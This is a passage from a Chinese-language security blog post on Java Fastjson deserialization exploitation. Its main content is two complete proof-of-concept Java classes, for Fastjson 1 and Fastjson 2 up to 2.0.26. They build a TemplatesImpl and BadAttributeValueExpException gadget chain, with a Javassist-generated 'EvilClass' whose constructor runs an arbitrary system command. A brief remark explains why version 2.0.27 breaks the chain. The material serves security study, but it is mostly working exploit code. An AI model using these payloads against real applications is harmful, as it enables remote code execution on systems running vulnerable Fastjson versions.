class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONArray;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.javassist.CtConstructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastJson1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getObject</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] classByteCode = getEvilClass(cmd);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classByteCode&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">array</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">        array.add(templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">exception</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        setFieldValue(exception, <span class="string">&quot;val&quot;</span>, array);</span><br><span class="line"></span><br><span class="line">        ArrayList&lt;Object&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Object&gt;();</span><br><span class="line">        list.add(templates);</span><br><span class="line">        list.add(exception);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getPayload(String cmd) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> getObject(cmd);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(object);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] payload = getPayload(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(payload);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 使用 Javassist 生成一个恶意类字节码：</span></span><br><span class="line"><span class="comment">     * - 类名 EvilClass</span></span><br><span class="line"><span class="comment">     * - 继承 AbstractTranslet（必须，否则不会被选为“主类”实例化）</span></span><br><span class="line"><span class="comment">     * - 构造器里执行命令</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] getEvilClass(String cmd) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建类 EvilClass</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;EvilClass&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 构造器：一旦实例化，就会执行系统命令</span></span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, ctClass);</span><br><span class="line">        constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd + <span class="string">&quot;\&quot;);&quot;</span>);</span><br><span class="line">        ctClass.addConstructor(constructor);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置 class 文件版本，49 对应 Java 5，兼容性更好</span></span><br><span class="line">        ctClass.getClassFile().setMajorVersion(<span class="number">49</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置父类为 AbstractTranslet（必须继承它才能被实例化）</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superC</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 返回生成的字节码数组</span></span><br><span class="line">        <span class="keyword">return</span> ctClass.toBytecode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 通过反射修改对象的私有字段值</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>); <span class="comment">// 绕过 private 限制</span></span><br><span class="line">        field.set(object, value);  <span class="comment">// 设置字段值</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="Fastjson2（≤-2-0-26）"><a href="#Fastjson2（≤-2-0-26）" class="headerlink" title="Fastjson2（≤ 2.0.26）"></a>Fastjson2（≤ 2.0.26）</h2><p>与 Fastjson1 相同，只不过依赖改为了：</p>
<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.fastjson2<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.26<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>poc 如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson2.JSONArray;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.javassist.CtConstructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastJson2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getObject</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] classByteCode = getEvilClass(cmd);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classByteCode&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">array</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">        array.add(templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">exception</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        setFieldValue(exception, <span class="string">&quot;val&quot;</span>, array);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> exception;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getPayload(String cmd) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> getObject(cmd);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(object);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span> [] payload = getPayload(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(payload);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 使用 Javassist 生成一个恶意类字节码：</span></span><br><span class="line"><span class="comment">     * - 类名 EvilClass</span></span><br><span class="line"><span class="comment">     * - 继承 AbstractTranslet（必须，否则不会被选为“主类”实例化）</span></span><br><span class="line"><span class="comment">     * - 构造器里执行命令</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] getEvilClass(String cmd) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建类 EvilClass</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;EvilClass&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 构造器：一旦实例化，就会执行系统命令</span></span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, ctClass);</span><br><span class="line">        constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd + <span class="string">&quot;\&quot;);&quot;</span>);</span><br><span class="line">        ctClass.addConstructor(constructor);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置 class 文件版本，49 对应 Java 5，兼容性更好</span></span><br><span class="line">        ctClass.getClassFile().setMajorVersion(<span class="number">49</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置父类为 AbstractTranslet（必须继承它才能被实例化）</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superC</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 返回生成的字节码数组</span></span><br><span class="line">        <span class="keyword">return</span> ctClass.toBytecode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 通过反射修改对象的私有字段值</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>); <span class="comment">// 绕过 private 限制</span></span><br><span class="line">        field.set(object, value);  <span class="comment">// 设置字段值</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>2.0.27 版本开始，<code>JSON#toString</code> 不再调用 <code>JSON#toJSONString</code>，因此该利用链失效。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> (<span class="type">JSONWriter</span> <span class="variable">writer</span> <span class="operator">=</span> JSONWriter.of()) &#123;</span><br><span class="line">        writer.setRootObject(<span class="built_in">this</span>);</span><br><span class="line">        writer.write(<span class="built_in">this</span>);</span><br><span class="line">        <span class="keyword">return</span> writer.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>


		</div>

		
		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
			<div class="article-copyright-info-container">
    <ul>
        <li><strong>Title:</strong> Java FastJson</li>
        <li><strong>Author:</strong> sky123</li>
        <li><strong>Created at
                :</strong> 2025-09-09 00:45:24</li>
        
            <li>
                <strong>Updated at
                    :</strong> 2025-09-18 23:01:28
            </li>
        
        <li>
            <strong>Link:</strong> https://skyi23.github.io/2025/09/09/Java FastJson/
        </li>
        <li>
            <strong>
                License:
            </strong>
            

            
                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
            
        </li>
    </ul>
</div>

		</div>
		

		
		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
			
			<li class="tag-item mx-0.5">
				<a href="/tags/java-web/">#java web</a>&nbsp;
			</li>
			
		</ul>
		

		

		
		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
			
			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="prev" rel="prev" href="/2025/10/02/Java%20%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/">
					<span class="left arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-left"></i>
					</span>
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item truncate max-w-48">Java 表达式注入</span>
						<span class="post-nav-item">Prev posts</span>
					</span>
				</a>
			</div>
			
			
			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="next" rel="next" href="/2025/09/09/Java%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item truncate max-w-48">Java 反序列化</span>
						<span class="post-nav-item">Next posts</span>
					</span>
					<span class="right arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-right"></i>
					</span>
				</a>
			</div>
			
		</div>
		


		
		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
			<div class="comments-container mt-10 w-full ">
    <div id="comment-anchor" class="w-full h-2.5"></div>
    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
        Comments
    </div>
    

        
            
    <div id="giscus-container"></div>
    <script data-swup-reload-script defer>
        async function loadGiscus() {
            const giscusConfig = {
                'src': 'https://giscus.app/client.js',
                'data-repo': 'skyI23/my-giscus-discussions',
                'data-repo-id': 'R_kgDONL9k_w',
                'data-category': 'Announcements',
                'data-category-id': 'DIC_kwDONL9k_84CkEdK',
                'data-mapping': 'pathname',
                'data-strict': '0',
                'data-reactions-enabled': '1',
                'data-emit-metadata': '1',
                'data-theme': 'preferred_color_scheme',
                'data-lang': 'zh-CN',
                'data-input-position': 'bottom',
                'data-loading': 'lazy',
                'crossorigin': 'anonymous',
                'async': true
            }
            const giscusScript = document.createElement('script');
            for (const key in giscusConfig) {
                giscusScript.setAttribute(key, giscusConfig[key]);
            }
            document.getElementById('giscus-container').appendChild(giscusScript);
        }
        if ('true') {
            let loadGiscusTimeout = setTimeout(() => {
                loadGiscus();
                clearTimeout(loadGiscusTimeout);
            }, 1000);
        } else {
            document.addEventListener('DOMContentLoaded', loadGiscus);
        }
    </script>


        
        
    
</div>

		</div>
		
	</div>

	
	<div class="toc-content-container">
		<div class="post-toc-wrap">
	<div class="post-toc">
		<div class="toc-title">On this page</div>
		<div class="page-title">Java FastJson</div>
		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#FastJson-%E7%89%B9%E6%80%A7"><span class="nav-text">FastJson 特性</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#POJO-JSON%EF%BC%88%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%89"><span class="nav-text">POJO -&gt; JSON（序列化）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#toJSONString"><span class="nav-text">toJSONString</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E8%A1%8C%E4%B8%BA"><span class="nav-text">序列化行为</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B1%9E%E6%80%A7%E8%BF%87%E6%BB%A4%E8%A7%84%E5%88%99"><span class="nav-text">属性过滤规则</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B1%9E%E6%80%A7%E8%8E%B7%E5%8F%96%E8%A7%84%E5%88%99"><span class="nav-text">属性获取规则</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B1%9E%E6%80%A7%E8%BD%AC%E6%8D%A2%E8%A7%84%E5%88%99"><span class="nav-text">属性转换规则</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B"><span class="nav-text">序列化过程</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JSON-POJO%EF%BC%88%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%89"><span class="nav-text">JSON -&gt; POJO（反序列化）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B1%9E%E6%80%A7%E8%B5%8B%E5%80%BC%E7%89%B9%E6%80%A7"><span class="nav-text">属性赋值特性</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%95%B4%E4%BD%93%E6%B5%81%E7%A8%8B"><span class="nav-text">整体流程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AE%BF%E9%97%AE%E5%99%A8%E8%A7%84%E8%8C%83"><span class="nav-text">访问器规范</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B1%9E%E6%80%A7%E5%90%8D%E7%A7%B0%E5%8C%B9%E9%85%8D"><span class="nav-text">属性名称匹配</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B1%9E%E6%80%A7%E8%B5%8B%E5%80%BC%E7%AD%96%E7%95%A5"><span class="nav-text">属性赋值策略</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#parse"><span class="nav-text">parse</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%94%E5%9B%9E%E7%BB%93%E6%9E%9C%E7%B1%BB%E5%9E%8B"><span class="nav-text">返回结果类型</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A1%8C%E4%B8%BA"><span class="nav-text">反序列化行为</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B"><span class="nav-text">反序列化过程</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#parseObject"><span class="nav-text">parseObject</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B-1"><span class="nav-text">反序列化过程</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#FastJson-%E5%88%A9%E7%94%A8%E9%93%BE"><span class="nav-text">FastJson 利用链</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#TemplatesImpl"><span class="nav-text">TemplatesImpl</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JdbcRowSetImpl"><span class="nav-text">JdbcRowSetImpl</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BasicDataSource"><span class="nav-text">BasicDataSource</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#checkAutoType-%E7%BB%95%E8%BF%87"><span class="nav-text">checkAutoType 绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#checkAutoType-%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6"><span class="nav-text">checkAutoType 安全机制</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E7%BB%93%E6%9E%84%E4%B8%8E%E9%85%8D%E7%BD%AE"><span class="nav-text">相关结构与配置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6%E5%88%86%E6%9E%90"><span class="nav-text">安全机制分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%93%88%E5%B8%8C%E6%9C%BA%E5%88%B6%E5%88%86%E6%9E%90"><span class="nav-text">哈希机制分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E7%B1%BB%E5%9E%8B%E6%8F%8F%E8%BF%B0%E7%AC%A6%E7%BB%95%E8%BF%87"><span class="nav-text">基于类型描述符绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%95%E7%94%A8%E7%B1%BB%E5%9E%8B%E7%BB%95%E8%BF%87%EF%BC%881-2-25-1-2-41%EF%BC%89"><span class="nav-text">引用类型绕过（1.2.25 - 1.2.41）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%95%E7%94%A8%E7%B1%BB%E5%9E%8B%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87%EF%BC%881-2-42%EF%BC%89"><span class="nav-text">引用类型双写绕过（1.2.42）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B0%E7%BB%84%E7%B1%BB%E5%9E%8B%E7%BB%95%E8%BF%87%EF%BC%881-2-25-1-2-43%EF%BC%89"><span class="nav-text">数组类型绕过（1.2.25 - 1.2.43）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" 